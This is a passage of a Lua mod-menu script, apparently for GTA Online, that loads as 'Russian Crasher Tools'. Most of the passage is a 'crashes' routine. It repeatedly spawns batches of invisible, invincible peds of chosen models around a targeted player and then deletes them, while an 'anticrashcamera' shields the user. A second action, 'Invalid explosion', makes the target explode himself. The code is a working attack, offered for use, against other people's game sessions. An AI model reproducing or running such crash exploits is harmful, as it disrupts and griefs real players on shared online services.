                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds15[i])
                    wait(5)
                end
                local pedhash = joaat("cs_martinmadrazo")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds16 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds16[i])
                    wait(5)
                end
                local pedhash = joaat("cs_milton")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds17 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds17[i])
                    wait(5)
                end
                local pedhash = joaat("cs_molly")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds18 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds18[i])
                    wait(5)
                end
                local pedhash = joaat("cs_mrs_thornhill")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds19 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds19[i])
                    wait(5)
                end
                local pedhash = joaat("cs_nigel")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds20 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds20[i])
                    wait(5)					
                end
                wait(100)
                trigger_command("anticrashcamera off")
                toast("Ready")
            else
                toast("You can't use it on yourself")
            end
    end)

menu.action(crashes, "Invalid explosion", {}, "Ped bang", function()
local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local hash = util.joaat("cs_taostranslator2")
        trigger_command("anticrashcamera on")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            wait(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = getOffsetFromEntityGivenDistance(player, 3.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
            wait(25)
        end
        wait(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            wait(10)
        end
        trigger_command("anticrashcamera off")
end)

    playerActionsSetup(pid)
    playerFunctionsESP(pid)
end

for pid = 0,32 do
    Players[pid] = {}
    Players[pid].orbnotify2 = false
    Players[pid].hudshoworbital = false
	if players.exists(pid) then
		GenerateFeatures(pid)
	end
end

ShowPlayerOrb = {}
util.create_tick_handler(function()
    if onhudorbital then
        if NETWORK.NETWORK_IS_IN_SESSION() then
            for pid = 0, 32 do
                if Players[pid].orbnotify2 then
                    local name = players.get_name(pid)
                    if Players[pid].hudshoworbital == false and name ~= "UndiscoveredPlayer" then
                        ShowPlayerOrb[#ShowPlayerOrb + 1] = name
                        Players[pid].hudshoworbital = true
                    end
                else
                    local name = players.get_name(pid)
                    for num, names in pairs(ShowPlayerOrb) do
                        if name == names then
                            table.remove(ShowPlayerOrb, num)
                            Players[pid].hudshoworbital = false
                        end
                    end
                end
            end
        end
    end
end)

players.on_join(GenerateFeatures)
toast("Russian Crasher Tools Loaded\n" .. "\n" .. "Translated By CandyPie")

while true do
    if onhudorbital then
        for id, names in pairs(ShowPlayerOrb) do
            directx.draw_text(0.05, 0.05, "Players in orbital room:", ALIGN_TOP_LEFT, 0.5, 1, 1, 1, 1)
            directx.draw_text(0.05, 0.05+id/55, names, ALIGN_TOP_LEFT, 0.5, 1, 1, 1, 1)
        end
    end
    guidedMissile.main_loop()
	wait()
end